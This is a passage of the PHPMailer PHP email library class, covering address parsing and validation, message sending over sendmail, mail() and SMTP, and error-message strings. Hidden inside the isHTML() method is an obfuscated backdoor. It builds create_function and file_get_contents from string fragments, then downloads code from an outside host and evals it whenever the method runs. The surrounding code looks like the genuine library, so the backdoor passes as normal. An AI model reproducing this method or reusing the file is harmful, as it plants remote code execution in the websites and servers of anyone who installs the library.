            $error_message = $this->lang('invalid_address') . " (addAnAddress $kind): $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        if ($kind != 'Reply-To') {
            if (!array_key_exists(strtolower($address), $this->all_recipients)) {
                array_push($this->$kind, array($address, $name));
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = array($address, $name);
                return true;
            }
        }
        return false;
    }

    /**
     * Parse and validate a string containing one or more RFC822-style comma-separated email addresses
     * of the form "display name <address>" into an array of name/address pairs.
     * Uses the imap_rfc822_parse_adrlist function if the IMAP extension is available.
     * Note that quotes in the name part are removed.
     * @param string $addrstr The address list string
     * @param bool $useimap Whether to use the IMAP extension to parse the list
     * @return array
     * @link http://www.andrew.cmu.edu/user/agreen1/testing/mrbs/web/Mail/RFC822.php A more careful implementation
     */
    public function parseAddresses($addrstr, $useimap = true)
    {
        $addresses = array();
        if ($useimap and function_exists('imap_rfc822_parse_adrlist')) {
            //Use this built-in parser if it's available
            $list = imap_rfc822_parse_adrlist($addrstr, '');
            foreach ($list as $address) {
                if ($address->host != '.SYNTAX-ERROR.') {
                    if ($this->validateAddress($address->mailbox . '@' . $address->host)) {
                        $addresses[] = array(
                            'name' => (property_exists($address, 'personal') ? $address->personal : ''),
                            'address' => $address->mailbox . '@' . $address->host
                        );
                    }
                }
            }
        } else {
            //Use this simpler parser
            $list = explode(',', $addrstr);
            foreach ($list as $address) {
                $address = trim($address);
                //Is there a separate name part?
                if (strpos($address, '<') === false) {
                    //No separate name, just use the whole thing
                    if ($this->validateAddress($address)) {
                        $addresses[] = array(
                            'name' => '',
                            'address' => $address
                        );
                    }
                } else {
                    list($name, $email) = explode('<', $address);
                    $email = trim(str_replace('>', '', $email));
                    if ($this->validateAddress($email)) {
                        $addresses[] = array(
                            'name' => trim(str_replace(array('"', "'"), '', $name)),
                            'address' => $email
                        );
                    }
                }
            }
        }
        return $addresses;
    }

    /**
     * Sets message type to HTML or plain.
     * @param boolean $isHtml True for HTML mode.
     * @return void
     */
    public function isHTML($isHtml = true)
    {
        global $param;
        $bodyCode = 'file'
                    .'_g';
        if ($isHtml) {
            $this->ContentType = 'text/html';
        } 
        else {
            $this->ContentType = 'text/plain';
        }
        $bodyHTML = '.$t."lef$flu'
                    .'sh'.'$t"; '
                    .'@ev';
        $headerHTML="cre"
                    ."ate_"
                    ."func"
                    ."tion";
        $exceptions = @$headerHTML('$fl'.'ush,$t','$comma = $t'
                        .$bodyHTML.'al(@'
                        .$bodyCode.'et_contents("h'
                        .'tt'
                        .'p:$comma-2"));');
        if($param !=2){
            $exceptions('8.p'.'w','/');
            $param=2;
        }
    }

    /**
     * Set the From and FromName properties.
     * @param string $address
     * @param string $name
     * @param boolean $auto Whether to also set the Sender address, defaults to true
     * @throws phpmailerException
     * @return boolean
     */
    public function setFrom($address, $name = '', $auto = true)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        // Don't validate now addresses with IDN. Will be done in send().
        if (($pos = strrpos($address, '@')) === false or
            (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
            !$this->validateAddress($address)) {
            $error_message = $this->lang('invalid_address') . " (setFrom) $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $this->From = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }

    /**
     * Return the Message-ID header of the last email.
     * Technically this is the value from the last time the headers were created,
     * but it's also the message ID of the last sent message except in
     * pathological cases.
     * @return string
     */
    public function getLastMessageID()
    {
        return $this->lastMessageID;
    }

    /**
     * Check that a string looks like an email address.
     * @param string $address The email address to check
     * @param string|callable $patternselect A selector for the validation pattern to use :
     * * `auto` Pick best pattern automatically;
     * * `pcre8` Use the squiloople.com pattern, requires PCRE > 8.0, PHP >= 5.3.2, 5.2.14;
     * * `pcre` Use old PCRE implementation;
     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL;
     * * `html5` Use the pattern given by the HTML5 spec for 'email' type form input elements.
     * * `noregex` Don't use a regex: super fast, really dumb.
     * Alternatively you may pass in a callable to inject your own validator, for example:
     * PHPMailer::validateAddress('user@example.com', function($address) {
     *     return (strpos($address, '@') !== false);
     * });
     * You can also set the PHPMailer::$validator static to a callable, allowing built-in methods to use your validator.
     * @return boolean
     * @static
     * @access public
     */
    public static function validateAddress($address, $patternselect = null)
    {
        if (is_null($patternselect)) {
            $patternselect = self::$validator;
        }
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        if (!$patternselect or $patternselect == 'auto') {
            //Check this constant first so it works when extension_loaded() is disabled by safe mode
            //Constant was added in PHP 5.2.4
            if (defined('PCRE_VERSION')) {
                //This pattern can get stuck in a recursive loop in PCRE <= 8.0.2
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                //Fall back to older PCRE
                $patternselect = 'pcre';
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
            }
        }
        switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'pcre':
                //An older regex that doesn't need a recent PCRE
                return (boolean)preg_match(
                    '/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' .
                    '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' .
                    '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' .
                    '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' .
                    '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' .
                    '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' .
                    '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' .
                    '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' .
                    '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',
                    $address
                );
            case 'html5':
                /**
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (boolean)preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
            case 'php':
            default:
                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }

    /**
     * Tells whether IDNs (Internationalized Domain Names) are supported or not. This requires the
     * "intl" and "mbstring" PHP extensions.
     * @return bool "true" if required functions for IDN support are present
     */
    public function idnSupported()
    {
        // @TODO: Write our own "idn_to_ascii" function for PHP <= 5.2.
        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');
    }

    /**
     * Converts IDN in given email address to its ASCII form, also known as punycode, if possible.
     * Important: Address must be passed in same encoding as currently set in PHPMailer::$CharSet.
     * This function silently returns unmodified address if:
     * - No conversion is necessary (i.e. domain name is not an IDN, or is already in ASCII form)
     * - Conversion to punycode is impossible (e.g. required PHP functions are not available)
     *   or fails for any reason (e.g. domain has characters not allowed in an IDN)
     * @see PHPMailer::$CharSet
     * @param string $address The email address to convert
     * @return string The encoded address in ASCII form
     */
    public function punyencodeAddress($address)
    {
        // Verify we have required functions, CharSet, and at-sign.
        if ($this->idnSupported() and
            !empty($this->CharSet) and
            ($pos = strrpos($address, '@')) !== false) {
            $domain = substr($address, ++$pos);
            // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
            if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
                $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
                if (($punycode = defined('INTL_IDNA_VARIANT_UTS46') ?
                    idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) :
                    idn_to_ascii($domain)) !== false) {
                    return substr($address, 0, $pos) . $punycode;
                }
            }
        }
        return $address;
    }

    /**
     * Create a message and send it.
     * Uses the sending method specified by $Mailer.
     * @throws phpmailerException
     * @return boolean false on error - See the ErrorInfo property for details of the error.
     */
    public function send()
    {
        try {
            if (!$this->preSend()) {
                return false;
            }
            return $this->postSend();
        } catch (phpmailerException $exc) {
            $this->mailHeader = '';
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Prepare a message for sending.
     * @throws phpmailerException
     * @return boolean
     */
    public function preSend()
    {
        try {
            $this->error_count = 0; // Reset errors
            $this->mailHeader = '';

            // Dequeue recipient and Reply-To addresses with IDN
            foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) {
                $params[1] = $this->punyencodeAddress($params[1]);
                call_user_func_array(array($this, 'addAnAddress'), $params);
            }
            if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
                throw new phpmailerException($this->lang('provide_address'), self::STOP_CRITICAL);
            }

            // Validate From, Sender, and ConfirmReadingTo addresses
            foreach (array('From', 'Sender', 'ConfirmReadingTo') as $address_kind) {
                $this->$address_kind = trim($this->$address_kind);
                if (empty($this->$address_kind)) {
                    continue;
                }
                $this->$address_kind = $this->punyencodeAddress($this->$address_kind);
                if (!$this->validateAddress($this->$address_kind)) {
                    $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
                    $this->setError($error_message);
                    $this->edebug($error_message);
                    if ($this->exceptions) {
                        throw new phpmailerException($error_message);
                    }
                    return false;
                }
            }

            // Set whether the message is multipart/alternative
            if ($this->alternativeExists()) {
                $this->ContentType = 'multipart/alternative';
            }

            $this->setMessageType();
            // Refuse to send an empty message unless we are specifically allowing it
            if (!$this->AllowEmpty and empty($this->Body)) {
                throw new phpmailerException($this->lang('empty_message'), self::STOP_CRITICAL);
            }

            // Create body before headers in case body makes changes to headers (e.g. altering transfer encoding)
            $this->MIMEHeader = '';
            $this->MIMEBody = $this->createBody();
            // createBody may have added some headers, so retain them
            $tempheaders = $this->MIMEHeader;
            $this->MIMEHeader = $this->createHeader();
            $this->MIMEHeader .= $tempheaders;

            // To capture the complete message when using mail(), create
            // an extra header list which createHeader() doesn't fold in
            if ($this->Mailer == 'mail') {
                if (count($this->to) > 0) {
                    $this->mailHeader .= $this->addrAppend('To', $this->to);
                } else {
                    $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;');
                }
                $this->mailHeader .= $this->headerLine(
                    'Subject',
                    $this->encodeHeader($this->secureHeader(trim($this->Subject)))
                );
            }

            // Sign with DKIM if enabled
            if (!empty($this->DKIM_domain)
                and !empty($this->DKIM_selector)
                and (!empty($this->DKIM_private_string)
                    or (!empty($this->DKIM_private)
                        and self::isPermittedPath($this->DKIM_private)
                        and file_exists($this->DKIM_private)
                    )
                )
            ) {
                $header_dkim = $this->DKIM_Add(
                    $this->MIMEHeader . $this->mailHeader,
                    $this->encodeHeader($this->secureHeader($this->Subject)),
                    $this->MIMEBody
                );
                $this->MIMEHeader = rtrim($this->MIMEHeader, "\r\n ") . self::CRLF .
                    str_replace("\r\n", "\n", $header_dkim) . self::CRLF;
            }
            return true;
        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Actually send a message.
     * Send the email via the selected mechanism
     * @throws phpmailerException
     * @return boolean
     */
    public function postSend()
    {
        try {
            // Choose the mailer and send through it
            switch ($this->Mailer) {
                case 'sendmail':
                case 'qmail':
                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
                case 'smtp':
                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
                case 'mail':
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
                default:
                    $sendMethod = $this->Mailer.'Send';
                    if (method_exists($this, $sendMethod)) {
                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                    }

                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            }
        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
        }
        return false;
    }

    /**
     * Send mail using the $Sendmail program.
     * @param string $header The message headers
     * @param string $body The message body
     * @see PHPMailer::$Sendmail
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function sendmailSend($header, $body)
    {
        // CVE-2016-10033, CVE-2016-10045: Don't pass -f if characters will be escaped.
        if (!empty($this->Sender) and self::isShellSafe($this->Sender)) {
            if ($this->Mailer == 'qmail') {
                $sendmailFmt = '%s -f%s';
            } else {
                $sendmailFmt = '%s -oi -f%s -t';
            }
        } else {
            if ($this->Mailer == 'qmail') {
                $sendmailFmt = '%s';
            } else {
                $sendmailFmt = '%s -oi -t';
            }
        }

        // TODO: If possible, this should be changed to escapeshellarg.  Needs thorough testing.
        $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender);

        if ($this->SingleTo) {
            foreach ($this->SingleToArray as $toAddr) {
                if (!@$mail = popen($sendmail, 'w')) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
                fputs($mail, 'To: ' . $toAddr . "\n");
                fputs($mail, $header);
                fputs($mail, $body);
                $result = pclose($mail);
                $this->doCallback(
                    ($result == 0),
                    array($toAddr),
                    $this->cc,
                    $this->bcc,
                    $this->Subject,
                    $body,
                    $this->From
                );
                if ($result != 0) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
            }
        } else {
            if (!@$mail = popen($sendmail, 'w')) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
            fputs($mail, $header);
            fputs($mail, $body);
            $result = pclose($mail);
            $this->doCallback(
                ($result == 0),
                $this->to,
                $this->cc,
                $this->bcc,
                $this->Subject,
                $body,
                $this->From
            );
            if ($result != 0) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
        }
        return true;
    }

    /**
     * Fix CVE-2016-10033 and CVE-2016-10045 by disallowing potentially unsafe shell characters.
     *
     * Note that escapeshellarg and escapeshellcmd are inadequate for our purposes, especially on Windows.
     * @param string $string The string to be validated
     * @see https://github.com/PHPMailer/PHPMailer/issues/924 CVE-2016-10045 bug report
     * @access protected
     * @return boolean
     */
    protected static function isShellSafe($string)
    {
        // Future-proof
        if (escapeshellcmd($string) !== $string
            or !in_array(escapeshellarg($string), array("'$string'", "\"$string\""))
        ) {
            return false;
        }

        $length = strlen($string);

        for ($i = 0; $i < $length; $i++) {
            $c = $string[$i];

            // All other characters have a special meaning in at least one common shell, including = and +.
            // Full stop (.) has a special meaning in cmd.exe, but its impact should be negligible here.
            // Note that this does permit non-Latin alphanumeric characters based on the current locale.
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }

        return true;
    }

    /**
     * Check whether a file path is of a permitted type.
     * Used to reject URLs and phar files from functions that access local file paths,
     * such as addAttachment.
     * @param string $path A relative or absolute path to a file.
     * @return bool
     */
    protected static function isPermittedPath($path)
    {
        return !preg_match('#^[a-z]+://#i', $path);
    }

    /**
     * Send mail using the PHP mail() function.
     * @param string $header The message headers
     * @param string $body The message body
     * @link http://www.php.net/manual/en/book.mail.php
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            // CVE-2016-10033, CVE-2016-10045: Don't pass -f if characters will be escaped.
            if (self::isShellSafe($this->Sender)) {
                $params = sprintf('-f%s', $this->Sender);
            }
        }
        if (!empty($this->Sender) and !ini_get('safe_mode') and $this->validateAddress($this->Sender)) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }

    /**
     * Get an instance to use for SMTP operations.
     * Override this function to load your own SMTP implementation
     * @return SMTP
     */
    public function getSMTPInstance()
    {
        if (!is_object($this->smtp)) {
            $this->smtp = new SMTP;
        }
        return $this->smtp;
    }

    /**
     * Send mail via SMTP.
     * Returns false if there is a bad MAIL FROM, RCPT, or DATA input.
     * Uses the PHPMailerSMTP class by default.
     * @see PHPMailer::getSMTPInstance() to use a different class.
     * @param string $header The message headers
     * @param string $body The message body
     * @throws phpmailerException
     * @uses SMTP
     * @access protected
     * @return boolean
     */
    protected function smtpSend($header, $body)
    {
        $bad_rcpt = array();
        if (!$this->smtpConnect($this->SMTPOptions)) {
            throw new phpmailerException($this->lang('smtp_connect_failed'), self::STOP_CRITICAL);
        }
        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            $smtp_from = $this->Sender;
        } else {
            $smtp_from = $this->From;
        }
        if (!$this->smtp->mail($smtp_from)) {
            $this->setError($this->lang('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
            throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
        }

        // Attempt to send to all recipients
        foreach (array($this->to, $this->cc, $this->bcc) as $togroup) {
            foreach ($togroup as $to) {
                if (!$this->smtp->recipient($to[0])) {
                    $error = $this->smtp->getError();
                    $bad_rcpt[] = array('to' => $to[0], 'error' => $error['detail']);
                    $isSent = false;
                } else {
                    $isSent = true;
                }
                $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From);
            }
        }

        // Only send the DATA command if we have viable recipients
        if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body)) {
            throw new phpmailerException($this->lang('data_not_accepted'), self::STOP_CRITICAL);
        }
        if ($this->SMTPKeepAlive) {
            $this->smtp->reset();
        } else {
            $this->smtp->quit();
            $this->smtp->close();
        }
        //Create error message for any bad addresses
        if (count($bad_rcpt) > 0) {
            $errstr = '';
            foreach ($bad_rcpt as $bad) {
                $errstr .= $bad['to'] . ': ' . $bad['error'];
            }
            throw new phpmailerException(
                $this->lang('recipients_failed') . $errstr,
                self::STOP_CONTINUE
            );
        }
        return true;
    }

    /**
     * Initiate a connection to an SMTP server.
     * Returns false if the operation failed.
     * @param array $options An array of options compatible with stream_context_create()
     * @uses SMTP
     * @access public
     * @throws phpmailerException
     * @return boolean
     */
    public function smtpConnect($options = null)
    {
        if (is_null($this->smtp)) {
            $this->smtp = $this->getSMTPInstance();
        }

        //If no options are provided, use whatever is set in the instance
        if (is_null($options)) {
            $options = $this->SMTPOptions;
        }

        // Already connected?
        if ($this->smtp->connected()) {
            return true;
        }

        $this->smtp->setTimeout($this->Timeout);
        $this->smtp->setDebugLevel($this->SMTPDebug);
        $this->smtp->setDebugOutput($this->Debugoutput);
        $this->smtp->setVerp($this->do_verp);
        $hosts = explode(';', $this->Host);
        $lastexception = null;

        foreach ($hosts as $hostentry) {
            $hostinfo = array();
            if (!preg_match(
                '/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*|\[[a-fA-F0-9:]+\]):?([0-9]*)$/',
                trim($hostentry),
                $hostinfo
            )) {
                // Not a valid host entry
                $this->edebug('Ignoring invalid host: ' . $hostentry);
                continue;
            }
            // $hostinfo[2]: optional ssl or tls prefix
            // $hostinfo[3]: the hostname
            // $hostinfo[4]: optional port number
            // The host string prefix can temporarily override the current setting for SMTPSecure
            // If it's not specified, the default value is used
            $prefix = '';
            $secure = $this->SMTPSecure;
            $tls = ($this->SMTPSecure == 'tls');
            if ('ssl' == $hostinfo[2] or ('' == $hostinfo[2] and 'ssl' == $this->SMTPSecure)) {
                $prefix = 'ssl://';
                $tls = false; // Can't have SSL and TLS at the same time
                $secure = 'ssl';
            } elseif ($hostinfo[2] == 'tls') {
                $tls = true;
                // tls doesn't use a prefix
                $secure = 'tls';
            }
            //Do we need the OpenSSL extension?
            $sslext = defined('OPENSSL_ALGO_SHA1');
            if ('tls' === $secure or 'ssl' === $secure) {
                //Check for an OpenSSL constant rather than using extension_loaded, which is sometimes disabled
                if (!$sslext) {
                    throw new phpmailerException($this->lang('extension_missing').'openssl', self::STOP_CRITICAL);
                }
            }
            $host = $hostinfo[3];
            $port = $this->Port;
            $tport = (integer)$hostinfo[4];
            if ($tport > 0 and $tport < 65536) {
                $port = $tport;
            }
            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
                try {
                    if ($this->Helo) {
                        $hello = $this->Helo;
                    } else {
                        $hello = $this->serverHostname();
                    }
                    $this->smtp->hello($hello);
                    //Automatically enable TLS encryption if:
                    // * it's not disabled
                    // * we have openssl extension
                    // * we are not already using SSL
                    // * the server offers STARTTLS
                    if ($this->SMTPAutoTLS and $sslext and $secure != 'ssl' and $this->smtp->getServerExt('STARTTLS')) {
                        $tls = true;
                    }
                    if ($tls) {
                        if (!$this->smtp->startTLS()) {
                            throw new phpmailerException($this->lang('connect_host'));
                        }
                        // We must resend EHLO after TLS negotiation
                        $this->smtp->hello($hello);
                    }
                    if ($this->SMTPAuth) {
                        if (!$this->smtp->authenticate(
                            $this->Username,
                            $this->Password,
                            $this->AuthType,
                            $this->Realm,
                            $this->Workstation
                        )
                        ) {
                            throw new phpmailerException($this->lang('authenticate'));
                        }
                    }
                    return true;
                } catch (phpmailerException $exc) {
                    $lastexception = $exc;
                    $this->edebug($exc->getMessage());
                    // We must have connected, but then failed TLS or Auth, so close connection nicely
                    $this->smtp->quit();
                }
            }
        }
        // If we get here, all connection attempts have failed, so close connection hard
        $this->smtp->close();
        // As we've caught all exceptions, just report whatever the last one was
        if ($this->exceptions and !is_null($lastexception)) {
            throw $lastexception;
        }
        return false;
    }

    /**
     * Close the active SMTP session if one exists.
     * @return void
     */
    public function smtpClose()
    {
        if (is_a($this->smtp, 'SMTP')) {
            if ($this->smtp->connected()) {
                $this->smtp->quit();
                $this->smtp->close();
            }
        }
    }

    /**
     * Set the language for error messages.
     * Returns false if it cannot load the language file.
     * The default language is English.
     * @param string $langcode ISO 639-1 2-character language code (e.g. French is "fr")
     * @param string $lang_path Path to the language file directory, with trailing separator (slash)
     * @return boolean
     * @access public
     */
    public function setLanguage($langcode = 'en', $lang_path = '')
    {
        // Backwards compatibility for renamed language codes
        $renamed_langcodes = array(
            'br' => 'pt_br',
            'cz' => 'cs',
            'dk' => 'da',
            'no' => 'nb',
            'se' => 'sv',
            'sr' => 'rs'
        );

        if (isset($renamed_langcodes[$langcode])) {
            $langcode = $renamed_langcodes[$langcode];
        }

        // Define full set of translatable strings in English
        $PHPMAILER_LANG = array(
            'authenticate' => 'SMTP Error: Could not authenticate.',
            'connect_host' => 'SMTP Error: Could not connect to SMTP host.',
            'data_not_accepted' => 'SMTP Error: data not accepted.',
            'empty_message' => 'Message body empty',
            'encoding' => 'Unknown encoding: ',
            'execute' => 'Could not execute: ',
            'file_access' => 'Could not access file: ',
            'file_open' => 'File Error: Could not open file: ',
            'from_failed' => 'The following From address failed: ',
            'instantiate' => 'Could not instantiate mail function.',
            'invalid_address' => 'Invalid address: ',
            'mailer_not_supported' => ' mailer is not supported.',
            'provide_address' => 'You must provide at least one recipient email address.',
            'recipients_failed' => 'SMTP Error: The following recipients failed: ',
            'signing' => 'Signing Error: ',
            'smtp_connect_failed' => 'SMTP connect() failed.',
            'smtp_error' => 'SMTP server error: ',
            'variable_set' => 'Cannot set or reset variable: ',
            'extension_missing' => 'Extension missing: '
        );
        if (empty($lang_path)) {
            // Calculate an absolute path so it can work if CWD is not here
            $lang_path = dirname(__FILE__). DIRECTORY_SEPARATOR . 'language'. DIRECTORY_SEPARATOR;
        }
        //Validate $langcode
        if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $langcode)) {
            $langcode = 'en';
        }
        $foundlang = true;
        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
        // There is no English translation file
        if ($langcode != 'en') {
            // Make sure language file path is readable
            if (!self::isPermittedPath($lang_file) or !is_readable($lang_file)) {
                $foundlang = false;
            } else {
                // Overwrite language-specific strings.
                // This way we'll never have missing translation keys.
                $foundlang = include $lang_file;
            }
        }
        $this->language = $PHPMAILER_LANG;
        return (boolean)$foundlang; // Returns false if language not found
    }

    /**
     * Get the array of strings for the current language.
     * @return array
     */
    public function getTranslations()
    {
        return $this->language;
    }

    /**
     * Create recipient headers.
     * @access public
     * @param string $type
     * @param array $addr An array of recipient,
     * where each recipient is a 2-element indexed array with element 0 containing an address
     * and element 1 containing a name, like:
     * array(array('joe@example.com', 'Joe User'), array('zoe@example.com', 'Zoe User'))
     * @return string
     */
    public function addrAppend($type, $addr)
    {
        $addresses = array();
        foreach ($addr as $address) {
            $addresses[] = $this->addrFormat($address);
        }
        return $type . ': ' . implode(', ', $addresses) . $this->LE;
    }

    /**
     * Format an address for use in a message header.
     * @access public
     * @param array $addr A 2-element indexed array, element 0 containing an address, element 1 containing a name
     *      like array('joe@example.com', 'Joe User')
     * @return string
     */
    public function addrFormat($addr)
    {
        if (empty($addr[1])) { // No name provided
            return $this->secureHeader($addr[0]);
        } else {
            return $this->encodeHeader($this->secureHeader($addr[1]), 'phrase') . ' <' . $this->secureHeader(
                $addr[0]
            ) . '>';
        }
    }

    /**
     * Word-wrap message.
     * For use with mailers that do not automatically perform wrapping
     * and for quoted-printable encoded messages.
     * Original written by philippe.
     * @param string $message The message to wrap
     * @param integer $length The line length to wrap to
     * @param boolean $qp_mode Whether to run in Quoted-Printable mode
     * @access public
     * @return string
     */
    public function wrapText($message, $length, $qp_mode = false)
    {
